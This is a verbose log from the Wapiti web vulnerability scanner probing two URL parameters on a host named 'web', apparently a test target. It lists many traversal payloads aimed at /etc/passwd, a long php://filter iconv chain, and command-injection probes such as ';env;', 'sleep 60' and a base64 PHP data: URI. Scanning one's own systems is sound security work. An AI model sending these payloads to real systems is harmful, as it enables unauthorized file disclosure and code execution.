2024-03-21 13:04:27.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:27.958 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:28.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:29.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:29.664 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:30.229 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:30.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:31.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:31.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:32.484 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:33.048 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:33.621 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:34.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 13:04:34.753 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:35.312 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:35.868 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:36.427 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:36.985 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:37.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:38.097 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:38.653 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:39.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:39.781 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:40.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:40.940 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:41.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:42.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 13:04:42.653 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:43.214 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:43.775 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:44.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 13:04:44.900 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:45.463 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:46.031 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:46.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:47.162 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:47.721 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:48.282 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-21 13:04:48.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 13:04:49.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 13:04:49.975 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 13:04:50.540 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 13:04:51.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:51.661 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 13:04:52.220 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 13:04:52.819 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-21 13:04:52.834 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?redirect_to=fuzz&piereg_logout_url=true (0)
2024-03-21 13:04:52.837 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%3Benv%3B&piereg_logout_url=true (0)
2024-03-21 13:04:53.405 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%7Cenv%7C&piereg_logout_url=true (0)
2024-03-21 13:04:53.964 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%3Benv%3B&piereg_logout_url=true (0)
2024-03-21 13:04:54.540 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%3Benv%3B&piereg_logout_url=true (0)
2024-03-21 13:04:55.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&piereg_logout_url=true (0)
2024-03-21 13:04:55.665 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz%3Benv%3B&piereg_logout_url=true (0)
2024-03-21 13:04:56.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz%0Aenv%3B&piereg_logout_url=true (0)
2024-03-21 13:04:56.782 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%26set%26&piereg_logout_url=true (0)
2024-03-21 13:04:57.344 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=set&piereg_logout_url=true (0)
2024-03-21 13:04:57.920 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=env&piereg_logout_url=true (0)
2024-03-21 13:04:58.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%2Fe%00&piereg_logout_url=true (0)
2024-03-21 13:04:59.026 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:04:59.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:00.131 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:05:00.706 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:01.261 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:05:01.814 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:02.369 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:05:02.930 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:03.492 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:05:04.047 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:04.605 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&piereg_logout_url=true (0)
2024-03-21 13:05:05.164 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&piereg_logout_url=true (0)
2024-03-21 13:05:05.725 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&piereg_logout_url=true (0)
2024-03-21 13:05:06.279 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%60%29%60&piereg_logout_url=true (0)
2024-03-21 13:05:06.832 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%60sleep%2060%60&piereg_logout_url=true (0)
2024-03-21 13:05:07.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%3Bsleep%2060%3B&piereg_logout_url=true (0)
2024-03-21 13:05:07.942 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=a%7Csleep%2060%3B&piereg_logout_url=true (0)
2024-03-21 13:05:08.502 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=%26ping%20-n%2025%20127.0.0.1%26&piereg_logout_url=true (0)
2024-03-21 13:05:09.060 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%3Benv%3B (0)
2024-03-21 13:05:09.621 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%7Cenv%7C (0)
2024-03-21 13:05:10.203 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%3Benv%3B (0)
2024-03-21 13:05:10.821 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%3Benv%3B (0)
2024-03-21 13:05:11.402 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-21 13:05:11.976 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%3Benv%3B (0)
2024-03-21 13:05:12.550 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=true%0Aenv%3B (0)
2024-03-21 13:05:13.125 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%26set%26 (0)
2024-03-21 13:05:13.700 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=set (0)
2024-03-21 13:05:14.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=env (0)
2024-03-21 13:05:14.865 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=%2Fe%00 (0)
2024-03-21 13:05:15.443 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-21 13:05:16.000 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?redirect_to=fuzz&piereg_logout_url=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
